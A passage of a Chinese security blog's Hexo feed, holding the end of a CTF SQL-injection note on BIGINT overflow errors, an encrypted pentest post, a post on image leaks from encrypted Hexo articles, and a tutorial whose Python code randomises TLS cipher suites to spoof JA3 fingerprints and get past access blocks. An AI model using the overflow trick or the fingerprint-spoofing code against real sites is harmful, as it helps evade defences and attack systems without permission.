<li><h4 id="最后的重点就是-9223372036854775807"><a href="#最后的重点就是-9223372036854775807" class="headerlink" title="最后的重点就是 9223372036854775807"></a>最后的重点就是 9223372036854775807</h4>  在mysql中，默认数字会视为<code>BIGINT</code>类型，也就是-9223372036854775808-9223372036854775807<br>  如果9223372036854775807+1就会溢出，然后报错。<br>  但是如果是9223372036854775808，他会默认把这个数字转换成<code>unsigned bigint</code>类型<br>  如下图<br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/1.jpg" alt><br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/2.jpg" alt><br>  那么如果直接设置9223372036854775808，他是不会报错的，因为会把他转化为<code>unsigned bigint</code>类型<br>  所以需要9223372036854775807+1，这样就超过bigint类型的最大范围<br>  当然也可以超过<code>unsigned bigint</code>，比如18446744073709551615+1，当然还有很多其它类型double类型之类的，都可以去溢出，原理相同，这种方法不会在语句中出现括号</li>
</ul>
<h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h2><ul>
<li>case:<a href="https://dev.mysql.com/doc/refman/8.0/en/case.html">https://dev.mysql.com/doc/refman/8.0/en/case.html</a></li>
<li>utf8mb4_bin:<a href="https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html">https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html</a></li>
<li>collate:<a href="https://www.jb51.net/article/214738.htm">https://www.jb51.net/article/214738.htm</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>实战|看我如何从url跳转到盗号</title>
    <url>/2022/10/13/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E4%BB%8Eurl%E8%B7%B3%E8%BD%AC%E5%88%B0%E7%9B%97%E5%8F%B7/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="0812e8fe096560142d950d298e99d24f600648f50a342a34b549c556f208099a">997c39fd209fc88ff14214af16a192b2c0d0a378e6a90d93e73b2a42d40bfff4be8925ff6cbb5176939d617643ddb4eccd51b320fa7070a3843da66ec6f0d5ff6b375ad4b05f7b3bf3f08f32bd574fa98244a214e278385c1237bbe73ebab60d30e3a37a83fbc0081c646090ecaa8193244b6e0fe95eddcf06eee433df1200e0f23c10140e3decb0b32f2b20005ec00a1ab7f1a7f9226fc3d6347b7870688749106b6983aab071879d92212bf688d3869b4d539971165a6b4e0648db4fb279f8de764d3d397a74cd983a2e62f5dd0391b72790489b6caed499cd805080614cfd85ffcf5cd247118ec9539959e4741a56d1f5356b1b861f058b3d1af2378fbc865275c81fd71af946a2185ca1143e197e52797cdba7cecbe8b2bfbdc18c537b9dbb2bed061af84a1f214d35a6b0c700caa26f9de04638daac3bc531966aec421977619cf3c3499c417dd4a1904babb36a4ebdb94c31b7c606257b993a2a1b1496c009f6ac4e6218e59480b046f17998806134618bc6aeede34a3b8f3cef00572a8385ed70c4be159534de4af6a6ab52e8bd8b350a08e18a5feb82d2b6e70ef0c101aeb4a3cc0917d5c1e0354fef4a5ae53aa864a5d86ceeea8c396f886e5be8cac0cdbc93cf2ad5624bd89a432aa5135264c24247e90339ad847816ca2fead97251d421f61a92e1e4ac662a54c4caa8c90393c564a1febc92185e1a9762d69d4a639296dcb92ca73ae9be10f5d99203f44a022b527a81f77ffb1a2ee215b420e57e895c236634323d9c736332a06a78d18bd52204a0ee8f5809b306d07feb0cde1ab6bb962e95a821d736f02c4e131167fa1b8830c349c7cbbb6824d1105cda5a8bd8ddc3fa527d15da793fea863fcfa11eeeced15f4728d3cfa2740f420c6f5720fd75dbc2565f011fea6a1f73c9623c9ccddd32ba3f74f9d8eff9372da68a305123448e4f7ec7e429ae61879cc2421bbec59171c3d8d7e2acb621921050cb1398a4f05c5cb2d46de6964946fd6c52beb9d81f291ac928ed5b6811224d574050ad7e248a49cf6b7627c7cd5f93d7aa0c8e222d33ac2277aafbefc21a0a1ac4a34c45cfdfe27ef88b9d49327b64a87c06f979a130ff6675df7139699500b409ba119e5a7357f76a3a8ba573e8d3ff2e9bb649a07e39c9589faf0ef559e13dd22e6ddbff63e45e3a19796888aa83cc425271f5676e1f0522948ceb3236dd09b0a84d517273c6b3f3de2f81433a7ae617d1797da52b777ba992ed3fe5dda6967813c830ca819f3a90a011846fc288044d4e44906e21be650c1f2ef49b932a4abfb7b41b935e6a8433f63846c65b6a145fe9b5676cf53f617b88414409116010cba308f385f06234f2eb53efde051c478dba672373f72f31e1677121a1ec6407574342fb88b18de92b79ae8b23e3b7f6bdbf78d5f9c1181282fa8cf46345060b33f97af4142256d3be239b996afa6fa12651f0089eacf17d0560381cdb88a644d184e4e1e30548f7d5d572c871ac9c0ff15bdbbdb0a4c7fcdb19c575ab7601e561c3d8cbe6006ec54efa67bd4927ae99be2d3d460eecb16574add8240b2c139f0ae1990aa621faa66c38852621025fef1ad7e700e8ac1c6cac6cc8c0751b2a14f02365558fd9a71a7a5026b1e76cff71c34d7609d84c9a669415f027520418880743c6c6a9def0d2f440fef49565eaca72c8198fb55515fd48fe28c4213630b6e95b1c9c749db56478b7d183ecd6293b78f9b86ef3fcc89f9df13155fa3596bb73f0ed01a6868c6c507bab921fc661cc889f21045383ae5686c9120fd46bbae3b0bbaca0cd41796485fc828e2f5d8d1cbccb15b3a0423a8c742f4c4b4a23b35b55c6cc7eac5f241efe6ab81f330f46a6204daaa537326a48d580d9d4922a2c975c4670afe91de833bd031d374e333c9fe18ac8be3fc2415bdb463a405c9d80007ac41970a4a7bbb52e80a937d16ea463af5d752d5a9e27f0cb51b6428626d87822d952425ce287b2c6fd59908ed942fc7b0adc3151fa7823c7eef63016f8e3b827e256ca86230d6b7294902a4663ade2624dd0b4fd6277565b9a13965980e36a2d905b9255a042e278e11a05c304b56608f94b1b4f31c3468859ae5c86ea7a5d73ac2a6e97dbfe0d3b2c2c5a1cda69f1314fb34d01b9473ed85b30bddf24ddd411b00d2d8b267bf994ff50d52f8458024842a754f330dbb15f16de31b550e032ebff48f652715139ca30d6b4d6951031bab676a7db05f4ec986cd03d99a483b7627df0a0620231e10d95922d31dfdfc78e8ea46adcfcb87625653e79dc2867cc71f193f3d3446813a8b624aaf5dc975d45afa38f7512d9be1542eef02af7c9fcca98ce66aa32708cfde38c1b2c36ca9ab3d6bd91806678300f455c3adb29b76c9af3469e11412d8b49825e97e37fd9b39a9d8857dd7cffdaf3b4a137b20792255488f79ccb426a61c73daed5986b2deeec79f88e588d17a90b20caf19e656a9977496b2532896f7b4e4472af584ee46f942bd287091047f70a50a9d333febc92cde30a26dc2e65f5b5dc37a9313bb6a4e772ca6e7ae815fdb4d5489ba72be612523c7bc1c40bce119fc701f0caa8b0912f1e1882ec204e0ba3391f29320eec8068379f0338e98fc07dbbd304cdf4cc9bef050c2effcdbf2179f952b066a20ae25abd6c486d115bb452ec97a519ebacc0b222ab170b850b52505e185001b3baef58dee7db561da3755f3dce8d1bee98d275f44166a5ef1235ec9de2a0e8bcdb5ea8637b96dfc43864e7a9de28b68797c6eb7a6904a1c4075e8a229fc0411cd3dc143addfbd31f67577603df9c3d95385149d1571720bf58de3a3a51dcb7d063d37ae512d634f4d33fedf5136964680996b71d81fba334b9370c06b2d8d22c09b402dcca91120c3d96fd27aeef455e99480f52e58ddfe4581b41f254cd2a999ab120539b2b30226c350e437234983ca32c4c863156d21875b4c5bcecee6cfbf85570395d730c42ba7f08211008e5222db00d13b40e7898682870197063ce56b32b7fe1f0d89eecbce4db0eb2893b60120187c22370eb5afc487799ca162be9ea329ef42e12e171139c8f7a0dacac519f9031a178bc311186650e34818504df5fe0e749cd78fff122b7241e1aa0f5dfc46331cc64a22506d55782a6dd71f4ef38beee79a66f31c7b1b74c342307787a13d58e378992503595eabf6e4f224126b39582889d1bc1485be239e77a783d474a843f0b977626a4335f453fc0452e4af9ff838c1270f00f41729ebfec712178fe911ccb7faedd98e45cfa2fbade323b91447de5fb0988d4e60eeb1864f27c80bbaab5dd1043bb5ed317a7339de69088a297519c92a8dc6a798246be4556ee117de0080995f641bca8b79913207c73efa612d97111bc093aeed38f6147c70bc89559e2867db3dd9d4c14931137b5c46beba21b6a002b219e897351f9804ca7c08942f44818d7e47d49c5c7e9f5b4d331fd36424c13ae213375faf3ad56c701e15d74bc8eadb3727803defeb957cd46605f653cb21671b3ee8cac1ef336d0ae7d21e2e267f419766d532a4d3bd06c86fe6920c1258bc8f862185b2481ac78ff10555bd0881cb23fb5d347ba7d2cae080ba0a68facd9645996b2da04d1ff108634f2ce31a60f8c6173c4ef531200909327e91054da4b1ec3583b79f3a0af03c41497de78d6064957ed161a8ad03d84a15b7f350532bf8a0aeb883391b540ffc06ddc51876c84c5ab6df8aa2c51c01d7e91d46ba1310973802c73e987756305bb62fabb920007ac3811217edb757719929a2e856506713c1384fe392ce0587b15d73823234e55ecd67f1f05a741a11d03004f750666cc6bc0db4593c20a6306d63695c2312766ba8fda0cddb3ba724b7e0005b643d1c1b4d7f863251279cac90f2728c8608bd7f5dfdfc3e0cab3dabe084525edcf8dd3f6605f596a614bcbc447e38b80983b734a328d65e0c7901d2e8fe6e02f842a426d12d2b2d7a6454d87efb86b98d3b7872f533967641015292488a70a59c61039518ea88560f7eee1cfddf5a3e7f927164430a480ef1a78dab4f81b8f9cd93644d6acd96c7985a15543741f62aefbdee1b3632534de0d27531edb22602da31c354b6765b65619a0f934e68a05940e5bfe614fc666417fbccbee7b223419447ac7725907e9839ddd03cb304bf7e660cd63eca1d8d5015094beafdf9c92ac6909df7aa8a9c3e84061c814009170ae8d9a4d49aadaaa0226229613865226a2b91e751dae760b0135c7b5b93315f4067c2ebddedc19d2e6de70028da68dd0b481b12e9d189a2ddd630285ec096b443ab237ec0af70b7deb8bf98ff6965664f9daec57336d5c3d2411e8f1f7458ee6a3eda809bdff220e2aaa7b988183d2e7a5cba3c5801a758637a7fcf83fc39fdd0e3e62d6b2e8d1214e071e85d6f4a46913b963cfa13726fe505b20e8e2e899c2662810d086dc677f70d59443c725a60cefffcdfd0071d3842e67090faaa5986d6e058932fbb825ce14ba967184ac875c72fc1930ae10482bb000452458c0e8b7f4bf51906c215beea156b6e5766c2243a706d2de356c202ff3be3746944d83f728f1d2377c176b337cc1795bcfe1ac15a5233a905883ed1890192bfbe4f9ca0b09db75e4e80167a52a8a9f32eefd7ce70b719ef50f59ae355cfaa36f39e13fd0a70da6578f46e2d9ec203fb61c8137352047fe7c0c529b4e05614839b80add277404812986ca05b3ea5fd934d6b5ec11e2d9dbb91c97020505fa891e3ce63740ad2358114b24a2eb04e113ee2316a931d7c8d0c54e588e992c10eafe1e0cc181df84b1a92d3bcd5cbc8f2875a1a5f4be9794daffb673271e4ceaab69994071e97197fed3de4034a8c4d48e222450e5fd3a346ee76fc7b3c2cc87fde7a7934d2b6ffb7ed584158d2c02e2f5c84a86beccb1acef693a7dcee283c1781c1f43a6547d6013b93fd152477f7c80ccc9d2532c1a63092760b972a523c450eea4b19b71375d17f9f8bed94438c9e2fa640ce08231d18eeed0eae58fc823c4a58205740fa5b0cca40a17bfe9589e0f879e97a751528fe3d73c83b81ef9faadc63aae3a4948d945c139f90b40701826410a18cbed75ab7d7bf382273386c78a823bd01c53f757f7d4837c658e85b540db1ef937e57429c1e3e5473ba7a552733ae84846342ca3f67a023d3b3f11f3c416c8600a26b48322dc65be46b807f2a1e43730d2fa7bf63a6c2d5721adca143ab3445d1a9c7182b71b525c6ca1ae1054253997e6e25fe1da96ccea9d4bb08767e0751f56430a8a76ff3fae2a9d51f4198a93aa4d4f6e175f3baa96545e866517a21e0877dc5f452fdc3a7f6b5525556f71a94d407c71e222f34bc5899fa6fca29865f910d999f62aebee17a9b959940afd794465b1ebc5d65da3f3b41576d6b7b3c58cc1f1227fd2c47358f65ca1088f12620d36a8c49a09edcb2ab77f973115f5b71409886b8944a393408382e36a2666a85a3d44f2a97ee53afb5519a92302c6f9bb40208e47ab497266b299c245b2d10bd844a024639e88cb5aa3b78b58dddd494d943150b0c9098d5f09e5d117d310de65e13a0ca2ec5d5a0331152ffad4247671880be7a1b28558a7c17af559f74cfe80864e27628d0b6bf0006b75d45314f92690ffff3d0aeecbfddf82384844c12be71020bb724f007aa1ac8330213211aa62b99472dd0db1672ca9b8737ca60c911f49d1e61c02f7c1f9eab939eb7a6e884961b33d7a5da0936aac65a38716d3a235e7483e175ea2125c0f94628dc771a401c90361ddaa3570c392639fcab54b1566bef13ade296b911900fd8e663108660f0bc55081b59715a337df3103489e1d15c9c173105a65089870d4478dbc580cb1c4be8f6f76f71a6a62e7b9cb34e9463015836517d6f3018d1acbc798ab35848b92776d1ff6db23fdb374e189b5551ba95707e8bb6c4f23cbc7b83679413e872b2ee0dee120dc29121cbe23bccb6876cb8b3df36b48b5c630599f4d81366430fb06e313273d7e0cf85e5fec603215095f3ac60436fe84385d1d90bf2d687f00e33c77d7fc6aa65ae0c76595e0f3860a1c0255e0487cf9adfc1b2fb877cf464f0a457f090d6743d8e2b8a0a895c0200bf05a8e1a98773485916ff146d211ffb73491dfea3ebc079adce20669715e000c8e14b7473d299ca5b0859f70040ca6a17107ae903bbc07f314819a0011b2c30c72c6066f2ffd0854f863b865553bb7c8b56d7f7cef8edaa8800c86ba4c5057ed9b3d22aea5653c74d573c93fff5d49cf881293d639607fc7902eb2df59d235a0f5dcc4baa6f1efc1318dfb233763675e25cf16315129d410a9d82e3be6fae76b4775d3a917ecfbc21c6b4a31fac70a77822538abe5bd448b4f10579068663eedbca63d386b697a7e1b2c5a208ad158645602571c55697ed18634a1bc5ad5e8ed879d56013c57afd0b7b8b7e3eca5dab90c1bbf2555b5530ca12aec90a80b97ce7fc3218ca4f150b77553199589c7a4785b1d4fa3df738a7a076c56bfb82be80ff73ed00ed9bb20137b7c83d10a5c3e23b39dbac3a339a10016ae048df5fb58d680471597d209c3c0940696cd294c911f4af8b4b5e8f027dbdbbc6742a67543ead33da4ff6fba85b73a8c08f77d1de9b4e28450bb251b4d4f287c1c0dd8886ab610bff395aa08</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>实战</tag>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 敏感文件泄漏</title>
    <url>/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/</url>
    <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在发上一篇文章的时候，因为涉及到敏感信息所以装了个插件<br><code>npm install --save hexo-blog-encrypt</code><br><span id="more"></span><br>给我的博文进行了加密访问<br>今天心血来潮，去我的github仓库看了一眼<br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/1.jpg" alt><br>好家伙，发现图片全在里面，也就代表着别人只要翻一下我的仓库就能知道到底是哪个网站存在那个漏洞了</p>
<h2 id="看看别人存不存在这个问题"><a href="#看看别人存不存在这个问题" class="headerlink" title="看看别人存不存在这个问题"></a>看看别人存不存在这个问题</h2><p>这时候我就想到y4大佬的博客也有一些加密文章<br>我就去翻了一下<br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/2.jpg" alt><br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/4.jpg" alt><br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/3.jpg" alt><br>看来大部分人都应该没有意识到这个问题，都是加密了文章，但是图片还是上传了上去<br>虽然泄漏的并不多，也就只有图片，但也算一个小漏洞吧</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>因为不想花钱去买服务器，所以最后我就把图片链接全部改为图床的链接，应该就能解决这个问题了，然后把之前的图片全部删除掉</p>
]]></content>
      <categories>
        <category>信息泄漏</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>实战</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>突破限制访问-修改ja3指纹</title>
    <url>/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为在t00ls上看到有人提问，代理了ip也无法突破限制访问<br><span id="more"></span><br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/1.jpg" alt><br>我就想到了可能是对方网站是识别了你的tls特征<br>那么就需要修改这些特征，去突破访问限制</p>
<h2 id="入门ja3指纹"><a href="#入门ja3指纹" class="headerlink" title="入门ja3指纹"></a>入门ja3指纹</h2><h3 id="TLS会话"><a href="#TLS会话" class="headerlink" title="TLS会话"></a>TLS会话</h3><p>因为ja3指纹是基于TLS协议的，所以要先简单了解一下这个协议<br>TLS是ssl的进阶版本，用于加密会话<br>当初始化一个TLS会话的时候，需要进行先进行最基本的三次握手<br>在三次握手后，客户端会向服务端发送一个Client Hello包，然后服务端向客户端发送Server Hello包，这里我们主要关注这个Client Hello包<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/2.jpg" alt></p>
<h3 id="Client-Hello包基本结构"><a href="#Client-Hello包基本结构" class="headerlink" title="Client Hello包基本结构"></a>Client Hello包基本结构</h3><p><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/3.jpg" alt></p>
<p><br><br>这里只需要关注几个字段就行了</p>
<p>version:TLS的版本,这里是0x0303<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/4.jpg" alt></p>
<p><br><br>Cipher Suites:列举出客户端支持的加密算法，每一种加密算法对应一个hex值<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/5.jpg" alt></p>
<p><br><br>一系列Extension，每个都有不同的含义，这里不需要关注具体用处，只要知道是用一个十六进制值去代表每一种extension的就可以了<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/6.jpg" alt></p>
<h3 id="ja3指纹计算"><a href="#ja3指纹计算" class="headerlink" title="ja3指纹计算"></a>ja3指纹计算</h3><p>ja3的计算主要就是由上面那几个字段的十进制组合在一起，然后计算他们的md5，格式如下：<br><strong>TLSVersion,Cipher Suites,Extensions Type,Supported Groups,Elliptic curves point formats</strong><br>当一个字段有不同的类型，就用 “-” 按照<strong>顺序</strong>依次去连接，这个顺序很重要一会儿会提到<br>例如我这里就是<br><strong>771,4866-4867-4865-157-49313-49309-156-49312-49308-61-60-53-47-163-159-52394-49315-49311-49239-49235-162-158-49314-49310-49238-49234-107-106-196-195-103-64-190-189-57-56-136-135-51-50-69-68-49196-49200-49327-49325-49188-49192-49162-49172-49233-49232-192-186-132-65-52393-52392-49245-49249-49195-49199-49326-49324-49244-49248-49267-49271-49187-49191-49266-49270-49161-49171-255,0-11-10-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2</strong><br>进行md5加密后就是ja3指纹了<br><strong>a6b4648af79cb0e6c9070f2fca7d5ac2</strong></p>
<p>下面我依次介绍每块第一个数字的由来</p>
<p>771就是0x0303的十进制<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/14.jpg" alt><br><br><br>4866就是，0x1302的十进制<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/8.jpg" alt><br><br><br>0就是Extension:Server Name的type<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/9.jpg" alt><br><br><br>29就是Extension Supported Groups中的Supported Groups第一个<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/10.jpg" alt><br><br><br>0就是Extension ec_point_formats中Elliptic curves point formats第一个<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/11.jpg" alt></p>
<p>在wireshark最下面也会有显示这个ja3，但是这个并不会真正的存在于数据包中，而是服务端提取到客户端的相应字段进行计算后得到的<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/7.jpg" alt></p>
<h2 id="伪造ja3指纹"><a href="#伪造ja3指纹" class="headerlink" title="伪造ja3指纹"></a>伪造ja3指纹</h2><h3 id="用不同代理去访问网站"><a href="#用不同代理去访问网站" class="headerlink" title="用不同代理去访问网站"></a>用不同代理去访问网站</h3><p>这个网站可以看到自己的ja3指纹 <a href="https://kawayiyi.com/tls">https://kawayiyi.com/tls</a><br>我这里是用pandavpn的全局模式<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/12.jpg" alt>可以看到我的ip是<strong>107.187.83.12</strong>，我的tlsHashMd5也就是ja3指纹是<strong>6e43eefeaec91453751b092058ec8dd2</strong><br>当我换一个ip去访问的时候<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/13.jpg" alt><br>可以看到我的ip虽然变成了<strong>139.64.165.246</strong>，但是tlsHashMd5（ja3指纹）仍然是<strong>6e43eefeaec91453751b092058ec8dd2</strong><br>所以有时候就算各种换代理也无法访问网站可能就是这个原因，被记录下了ja3指纹</p>
<h3 id="修改ja3指纹"><a href="#修改ja3指纹" class="headerlink" title="修改ja3指纹"></a>修改ja3指纹</h3><p>那么当我们去修改Client Hello里面的一些信息，就可以达到修改ja3指纹突破访问限制，下面我直接贴出修改代码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="keyword">import</span> create_urllib3_context</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">ORIGIN_CIPHERS = (<span class="string">&#x27;ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:&#x27;</span></span><br><span class="line"><span class="string">&#x27;DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DESAdapter</span>(<span class="title class_ inherited__">HTTPAdapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        CIPHERS = ORIGIN_CIPHERS.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        random.shuffle(CIPHERS)</span><br><span class="line">        CIPHERS = <span class="string">&#x27;:&#x27;</span>.join(CIPHERS)</span><br><span class="line">        self.CIPHERS = CIPHERS + <span class="string">&#x27;:!aNULL:!eNULL:!MD5&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init_poolmanager</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        context = create_urllib3_context(ssl_version=<span class="number">2</span>,ciphers=self.CIPHERS)</span><br><span class="line">        kwargs[<span class="string">&#x27;ssl_context&#x27;</span>] = context</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(DESAdapter, self).init_poolmanager(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def proxy_manager_for(self, *args, **kwargs):</span></span><br><span class="line">    <span class="comment">#     context = create_urllib3_context(ssl_version=2,ciphers=self.CIPHERS)</span></span><br><span class="line">    <span class="comment">#     kwargs[&#x27;ssl_context&#x27;] = context</span></span><br><span class="line">    <span class="comment">#     super(DESAdapter, self).proxy_manager_for(*args, **kwargs)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SpoofJa3Get</span>(<span class="params">url,headers</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.headers.update(headers)</span><br><span class="line">    s.mount(url, DESAdapter())</span><br><span class="line">    resp = s.get(url)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    resp = SpoofJa3Get(<span class="string">&#x27;https://kawayiyi.com/tls&#x27;</span>,&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67&#x27;</span>&#125;)</span><br><span class="line">    data = resp.json()</span><br><span class="line">    <span class="built_in">print</span>(data[<span class="string">&#x27;tlsHashMd5&#x27;</span>])</span><br></pre></td></tr></table></figure></p>
<p>这个是运行效果，可以看到ja3指纹确实都改变了<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/15.jpg" alt></p>
<p>接下来简单讲解一下代码<br>这里主要是去继承原先的HTTPAdapter，在构造函数中将Cipher Suites进行打乱随机排序，然后去重写<code>init_poolmanager</code><br>可以看到官方文档介绍这个函数</p>
<blockquote>
<p>Initializes a urllib3 PoolManager.<br>&nbsp;&nbsp;&nbsp;This method should not be called<br>&nbsp;&nbsp;&nbsp;from user code, and is only exposed for use when subclassing the<br>&nbsp;&nbsp;&nbsp;:class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.<br>&nbsp;&nbsp;&nbsp;:param connections: The number of urllib3 connection pools to cache.<br>&nbsp;&nbsp;&nbsp;:param maxsize: The maximum number of connections to save in the pool.<br>&nbsp;&nbsp;&nbsp;:param block: Block when no free connections are available.</requests.adapters.HTTPAdapter></p>
</blockquote>
<p>只有短短的一句，根据名称猜测就是初始化一个连接池之类的，然后每次访问别的网站都要基于这个连接池去访问，类似与urllib3的PoolManager</p>
<p>create_urllib3_context 官方文档介绍我就不贴出来了，具体可以看<br><a href="https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/ssl_.py#L221">https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/ssl_.py#L221</a><br>简单说一下就是创建并且配置一个ssl内容的实例，并且返回这个实例，但是给出的参数与ja3指纹相关的只有</p>
<ul>
<li>ssl version</li>
<li>cipher suites</li>
</ul>
<p>ssl版本我们不能随便修改，不然就会出错，能修改的只有支持的加密算法<br>后面的代码我就不做过多解释了，应该都是很简单的</p>
